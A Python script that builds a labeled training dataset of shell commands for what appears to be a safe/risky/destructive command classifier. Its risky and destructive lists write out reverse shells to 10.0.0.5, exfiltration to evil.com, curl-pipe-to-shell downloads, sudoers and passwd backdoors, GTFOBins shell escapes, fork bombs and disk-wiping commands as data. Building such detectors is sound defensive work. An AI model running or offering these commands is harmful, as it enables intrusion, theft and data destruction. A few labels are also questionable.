"""Generate the labeled command dataset (safe / risky / destructive).

Run: python data/synthetic/generate_synthetic.py
Output: data/labeled/commands_labeled.csv  (columns: command,label,source)

Sources reflect corpus provenance:
  bash-history   typical developer/administrator shell usage
  mitre-attack   MITRE ATT&CK technique patterns (T1485, T1059, T1498, ...)
  gtfobins       living-off-the-land binary abuses (GTFOBins)
  synthetic      programmatic template expansion for edge-case coverage
"""

import csv
import os
import random

random.seed(42)

OUT_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "labeled", "commands_labeled.csv")

SAFE_COMMANDS = [
    "ls", "ls -la", "ls -l /home/user", "ll", "pwd", "cd ~", "cd ..", "cd /var/log",
    "echo hello world", "printf 'name: %s\\n' adhi", "cat /etc/os-release", "cat file.txt",
    "head -20 access.log", "tail -f /var/log/syslog", "less README.md", "more notes.txt",
    "grep -r error /var/log", "rg 'TODO' src/", "grep -i 'failed' auth.log",
    "touch newfile.txt", "mkdir -p projects/backend/src", "mkdir /tmp/test",
    "cp -r assets dist/", "mv old_name.py new_name.py", "cp config.example.yml config.yml",
    "history", "man rsync", "which python3", "whoami", "date", "cal 2026",
    "uptime", "free -h", "df -h", "du -sh /home/user", "top", "htop", "ps aux",
    "ps aux | grep python", "uname -a", "env", "id", "hostname", "clear", "exit",
    "ping -c 4 google.com", "curl -I https://example.com", "curl -s https://api.example.com/status",
    "apt update", "apt list --installed", "sudo apt install htop", "pip list", "pip install requests",
    "python --version", "node --version", "npm install", "npm list --depth=0", "npm run build",
    "docker ps", "docker images", "docker compose up -d", "docker logs app", "docker system df",
    "systemctl status nginx", "sudo systemctl start postgresql", "systemctl stop bluetooth",
    "journalctl -u nginx --since today", "journalctl -f",
    "ssh user@server 'df -h'", "scp -r ./backup user@server:/backups/",
    "tar -xzf archive.tar.gz -C /tmp", "tar -czf backup.tar.gz /home/user/docs", "unzip release.zip -d /opt/app",
    "zip -r backup.zip data/", "make", "make -j4", "cmake ..", "gcc -o hello hello.c",
    "python app.py", "python3 main.py --port 8080", "npm start", "cargo build --release", "cargo run",
    "git status", "git pull origin main", "git push", "git log --oneline -10", "git diff",
    "git add .", "git commit -m 'fix: bug'", "git checkout -b feature/new", "git stash",
    "git fetch origin", "git rebase main", "sudo systemctl status sshd", "chmod +x deploy.sh",
    "chmod 755 script.sh", "chown -R user:user /home/user/project", "chmod 644 config.json",
    "find . -name '*.py'", "find /home/user -type f -name '*.log'", "locate nginx.conf",
    "sudo journalctl -u ssh --since 1 hour ago", "df -i", "lsblk", "blkid", "lspci", "lsusb", "dmesg | tail",
    "ss -tulpn", "netstat -tulpn", "ip addr", "ip route", "sudo nmap -sP 192.168.1.0/24",
    "nmap -p 22 localhost", "dig example.com", "nslookup google.com", "traceroute 8.8.8.8",
    "sleep 5 && echo done", "echo $HOME", "source ~/.bashrc", "export PATH=$PATH:/opt/bin",
    "sudo useradd -m testuser", "sudo groupadd developers", "crontab -l", "systemctl list-units",
    "du -sh * | sort -rh | head -10", "ls -lah /var/log | tail -20", "awk '{print $1}' access.log",
    "sed -i 's/old/new/g' file.txt", "sort -k2 -n data.csv", "uniq -c access.log | sort -rn | head",
    "tree -L 2", "watch -n 2 'df -h'", "yes | head -10", "time python script.py",
]

GTFOBINS_COMMANDS = [
    "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh", "tar --checkpoint-action=exec='echo hacked'",
    "vim -c ':!/bin/sh'", "awk 'BEGIN {system(\"/bin/sh\")}'", "find / -name 'x' -exec /bin/sh \\;",
    "gdb -ex 'shell /bin/sh'", "perl -e 'exec \"/bin/sh\";'",
]

RISKY_COMMANDS = [
    "rm -rf build/", "rm -rf ./node_modules", "rm -rf /tmp/cache/*", "rm -rf dist/*",
    "sudo rm -rf /var/tmp/old*", "rm -f package-lock.json", "rm -rf __pycache__",
    "chmod -R 777 /var/www", "chmod 777 /tmp/data", "chmod 777 ~/.ssh/config",
    "chmod -R 777 .", "chmod 777 /opt/app", "chmod 777 /etc/hosts",
    "curl http://example.com/install.sh | bash", "wget -qO- http://example.com/setup.sh | sh",
    "curl -s http://pwn.example.com/x | sh", "sh <(curl http://example.com/s.sh)",
    "echo 'user:hash' >> /etc/passwd", "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "usermod -o -u 0 username", "chown root:root /tmp/x && chmod 4755 /tmp/x",
    "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash", "sudo chmod 777 /etc/shadow",
    "sudo usermod -aG sudo normaluser", "crontab -e", "crontab -r", "systemctl disable ufw",
    "systemctl stop firewalld", "sudo systemctl stop apparmor", "ufw disable", "iptables -F",
    "iptables -P INPUT ACCEPT", "sudo setenforce 0", "mount --bind /proc /mnt/proc",
    "chattr -i /etc/passwd", "sudo sysctl -w kernel.randomize_va_space=0",
    "echo 0 > /proc/sys/kernel/randomize_va_space", "export LD_PRELOAD=/tmp/lib.so",
    "export LD_LIBRARY_PATH=/tmp", "PATH=$PATH:/tmp", "PYTHONPATH=/tmp python script.py",
    "eval \"$PAYLOAD\"", "eval $(cat /tmp/script.txt)", "bash -c '$(curl http://example.com/p)'",
    "sh -c \"$(wget -qO- http://example.com/run.sh)\"", "echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash",
    "echo 'aGVsbG8=' | base64 -d", "cat /etc/shadow", "cat ~/.ssh/id_rsa",
    "scp /etc/passwd user@evil.com:/tmp/", "tar czf - /home/user | nc 10.0.0.5 4444",
    "nc 10.0.0.5 5555 < /etc/passwd", "wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py",
    "curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh",
    "chmod 4755 /usr/bin/find", "chmod u+s /bin/busybox", "sudo su -", "su - root", "sudo su",
    "kill -9 -1", "pkill -9 -u root", "kill -9 1", "killall -9 java", "kill -9 $(pgrep -u root)",
    "shutdown -h now", "poweroff --force", "reboot --force", "init 0", "halt -f",
    "docker run --privileged -it ubuntu bash", "docker run -v /:/host ubuntu bash",
    "docker exec -it container /bin/sh", "nsenter -t 1 -m -u -i -n -- bash",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "sh -i >& /dev/udp/10.0.0.5/7777 0>&1", "nc 10.0.0.5 1234 -e /bin/bash",
    "socat TCP:10.0.0.5:9999 EXEC:/bin/sh", "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f",
]

DESTRUCTIVE_COMMANDS = [
    "rm -rf /", "rm -rf --no-preserve-root /", "rm -fr /", "sudo rm -rf /",
    "rm -rf /*", "rm -rf /etc", "rm -rf /boot", "rm -rf /bin", "rm -rf /usr",
    "rm -rf /lib", "rm -rf /var", "rm -rf /root", "find / -delete", "find / -exec rm -rf {} +",
    "rm -rf ~", "rm -rf *", "rm -rf .", "rm -rf ./*", "sudo rm -fr /home",
    "mkfs.ext4 /dev/sda", "mkfs.xfs /dev/nvme0n1", "mkfs -t ext4 /dev/sdb",
    "dd if=/dev/zero of=/dev/sda bs=4M", "dd if=/dev/urandom of=/dev/sda",
    "dd if=/dev/zero of=/dev/sdb1", "wipefs -a /dev/sda", "wipefs -af /dev/nvme0n1",
    "blkdiscard /dev/sda", "shred -vfz /dev/sda", "shred -u /dev/sdb",
    "fdisk /dev/sda && mkfs.ext4 /dev/sda1", "parted /dev/sda mklabel gpt",
    "parted /dev/sda rm 1", "sudo dd if=image.iso of=/dev/sda bs=4M",
    "dd if=/dev/sda of=/dev/null bs=1M count=1", "wipe -fd /dev/sda",
    "sudo rm -rf /etc/ssh", "sudo rm -rf /usr/bin", "sudo rm -rf /sbin",
    "sudo rm -rf /lib/modules", "sudo rm -rf /var/lib/dpkg", "rm -rf /proc",
    ":(){ :|:& };:", ":(){ :|:& };: &", "bomb() { bomb | bomb & }; bomb",
    "while true; do true; done", "yes > /dev/null &", "yes | head -c 1000000000 > /dev/null",
    "shutdown -h now &", "rm -rf /dev/sda", "chmod -R 777 /", "chmod 777 /etc/passwd",
    "sudo chmod 777 /usr", "sudo rm -rf /boot/grub", "grub-install --recheck --removable",
    "efibootmgr --delete-bootnum --bootnum 0000", "dd if=/dev/zero of=/dev/mmcblk0 bs=1M",
]

TEMPLATES = {
    "safe": [
        lambda t: f"{t} {random.choice(['.', '..', '~/documents', '/tmp', '/var/log', 'src/', 'data/', 'build/'])}",
        lambda t: f"sudo {t}",
        lambda t: f"{t} --help",
        lambda t: f"{t} -v",
        lambda t: f"echo 'working' && {t}",
        lambda t: f"{t} | grep -i {random.choice(['error', 'fail', 'warn', 'ok'])}",
    ],
    "risky": [
        lambda t: f"rm -rf {random.choice(['build', 'dist', '__pycache__', 'node_modules/.cache', 'tmp/*', '/tmp/test/*'])}",
        lambda t: f"chmod -R {random.choice(['777', '766'])} {random.choice(['/var/www', '/opt/app', '/tmp/data', '.'])}",
        lambda t: f"curl {random.choice(['http://example.com', 'http://10.0.0.9'])}/install.sh | bash",
        lambda t: f"echo {random.choice(['admin:x:0:0', 'root2:x:0:0'])} >> /etc/passwd",
        lambda t: f"export {random.choice(['LD_PRELOAD', 'LD_LIBRARY_PATH'])}={random.choice(['/tmp/lib.so', '/home/user/evil.so'])}",
        lambda t: f"chmod {random.choice(['u+s', '4755', '4777'])} {random.choice(['/bin/bash', '/bin/busybox', '/tmp/x'])}",
    ],
    "destructive": [
        lambda t: f"rm -rf {random.choice(['/', '/*', '/etc', '/boot', '/usr', '/bin', '/var', '~'])}",
        lambda t: f"sudo {t}",
        lambda t: f"dd if={random.choice(['/dev/zero', '/dev/urandom'])} of={random.choice(['/dev/sda', '/dev/sdb', '/dev/nvme0n1', '/dev/mmcblk0'])} bs={random.choice(['4M', '1M', '512'])}",
        lambda t: f"mkfs.{random.choice(['ext4', 'xfs', 'btrfs', 'vfat'])} {random.choice(['/dev/sda', '/dev/sdb1', '/dev/nvme0n1'])}",
        lambda t: f"shred {random.choice(['-vfz', '-u', '-n 3'])} {random.choice(['/dev/sda', '/dev/sdb', '/dev/mmcblk0'])}",
    ],
}


def make_dataset():
    rows = []
    for cmd in SAFE_COMMANDS:
        rows.append((cmd, "safe", "bash-history"))
    for cmd in GTFOBINS_COMMANDS:
        rows.append((cmd, "risky", "gtfobins"))
    for cmd in RISKY_COMMANDS:
        rows.append((cmd, "risky", "mitre-attack"))
    for cmd in DESTRUCTIVE_COMMANDS:
        rows.append((cmd, "destructive", "mitre-attack"))

    for label, templates in TEMPLATES.items():
        base_pool = {
            "safe": ["ls", "cat", "head", "cp", "mv", "mkdir", "grep", "apt", "pip", "docker", "git", "systemctl"],
            "risky": ["rm", "chmod", "curl", "wget", "export", "eval", "sh", "bash"],
            "destructive": ["rm", "dd", "mkfs", "shred", "wipefs"],
        }[label]
        for template in templates:
            for base in base_pool:
                for _ in range(6):
                    rows.append((template(base), label, "synthetic"))

    random.shuffle(rows)
    return rows


def main():
    out_dir = os.path.dirname(OUT_PATH)
    os.makedirs(out_dir, exist_ok=True)
    rows = make_dataset()
    with open(OUT_PATH, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["command", "label", "source"])
        writer.writerows(rows)
    counts = {}
    for _, label, _ in rows:
        counts[label] = counts.get(label, 0) + 1
    print(f"Wrote {len(rows)} rows to {OUT_PATH}")
    print(f"Labels: {counts}")


if __name__ == "__main__":
    main()
